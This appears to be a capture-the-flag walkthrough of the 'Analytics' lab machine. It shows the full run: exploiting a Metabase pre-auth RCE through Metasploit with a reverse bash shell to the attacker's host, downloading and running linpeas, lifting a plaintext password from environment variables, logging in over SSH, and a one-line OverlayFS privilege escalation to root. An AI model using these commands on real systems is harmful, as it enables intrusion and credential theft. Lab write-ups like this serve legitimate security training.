# Reconnaissances
## Port Scanning
`$ sudo nmap -p- -sC -T4 10.10.11.233`
```
Nmap scan report for 10.10.11.233
Host is up (0.029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://analytical.htb/

Nmap done: 1 IP address (1 host up) scanned in 48.64 seconds
```

### Observe for HTTP
`$ echo "10.10.11.233 analytical.htb" | sudo tee -a /etc/hosts`
`$ firefox analytical.htb`

Seems like the `Login` url redirected to `data.analytical.htb` then add more domain in `/etc/hosts`
```
10.10.11.233 analytical.htb data.analytical.htb
```

#### Data analytical
**Request**
```
GET /api/user/current HTTP/1.1
Host: data.analytical.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: close
Referer: http://data.analytical.htb/
Cookie: metabase.DEVICE=bdf071dc-b33a-472b-a213-5d3188f1c462
```

**Response**
```
HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 10 Mar 2024 06:36:36 GMT
Content-Type: text/plain
Content-Length: 15
Connection: close
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Last-Modified: Sun, 10 Mar 2024 06:36:36 GMT
Strict-Transport-Security: max-age=31536000
X-Permitted-Cross-Domain-Policies: none
Cache-Control: max-age=0, no-cache, must-revalidate, proxy-revalidate
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval' https://maps.google.com https://accounts.google.com    'sha256-K2AkR/jTLsGV8PyzWha7/ey1iaD9c5jWRYwa++ZlMZc=' 'sha256-ib2/2v5zC6gGM6Ety7iYgBUvpy/caRX9xV/pzzV7hf0=' 'sha256-isH538cVBUY8IMlGYGbWtBwr+cGqkc4mN6nLcA7lUjE='; child-src 'self' https://accounts.google.com; style-src 'self' 'unsafe-inline' https://accounts.google.com; font-src *; img-src * 'self' data:; connect-src 'self' https://accounts.google.com metabase.us10.list-manage.com   ; manifest-src 'self';  frame-ancestors 'none';
Expires: Tue, 03 Jul 2001 06:00:00 GMT

Unauthenticated
```

### Exploit Metabase
**Exploit-DB**
```    
$ searchsploit metabase
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Metabase 0.46.6 - Pre-Auth Remote Code Execution                                                                                          | linux/webapps/51797.py
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results                                     
```

**Metasploit**
```
msf6 > search metabase

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/http/metabase_setup_token_rce  2023-07-22       excellent  Yes    Metabase Setup Token RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rce
```

# Pre-Exploitation
```
msf6 > use exploit/linux/http/metabase_setup_token_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/http/metabase_setup_token_rce) > show options

Module options (exploit/linux/http/metabase_setup_token_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      3000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The URI of the Metabase Application
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/metabase_setup_token_rce) > 
```
```
msf6 exploit(linux/http/metabase_setup_token_rce) > set LHOST 10.10.14.21
LHOST => 10.10.14.21
msf6 exploit(linux/http/metabase_setup_token_rce) > set RHOST data.analytical.htb
RHOST => data.analytical.htb
msf6 exploit(linux/http/metabase_setup_token_rce) > set RPORT 80
RPORT => 80
msf6 exploit(linux/http/metabase_setup_token_rce) > 
```

# Exploit
```
msf6 exploit(linux/http/metabase_setup_token_rce) > run

[*] Started reverse TCP handler on 10.10.14.21:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version Detected: 0.46.6
[+] Found setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[*] Sending exploit (may take a few seconds)
[*] Command shell session 1 opened (10.10.14.21:4444 -> 10.10.11.233:52298) at 2024-03-10 01:51:52 -0500

id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
```

## Lateral Movement
Try to get an interactive shell
```
$ python3 -m http.server 8000                                  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Run on the `msfconsole`
`wget http://10.10.14.21:8000/linpeas.sh`

then
`bash linpeas.sh`
```
╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                     
SHELL=/bin/sh                                                                                                                                                               
MB_DB_PASS=
HISTSIZE=0
HOSTNAME=f34b61e0101b
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/tmp
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
HISTFILE=/dev/null
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=6
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HISTFILESIZE=0
MB_DB_CONNECTION_URI=
OLDPWD=/
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```
From the linpeas output, we've found a credential `Password: An4lytics_ds20223#`

### Try to use the credential
`$ ssh metalytics@10.10.11.233`
```
The authenticity of host '10.10.11.233 (10.10.11.233)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.233' (ED25519) to the list of known hosts.
metalytics@10.10.11.233's password: An4lytics_ds20223#
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar 10 07:37:39 AM UTC 2024


```

User Flag
```
metalytics@analytics:~$ cat user.txt 
919e2806c743bbb425a43e199fe08f1e
```

# Privilege Escalation
```
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                          
Linux version 6.2.0-25-generic (buildd@lcy02-amd64-044) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2
lsb_release Not Found                                             
```

## Exploit for `Ubuntu 22.04.1`
Refer to:
- https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/

Then: 
```
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
root@analytics:~# cat /root/root.txt
3f27ddd1842cf9d4a6668148a27c4ed1
```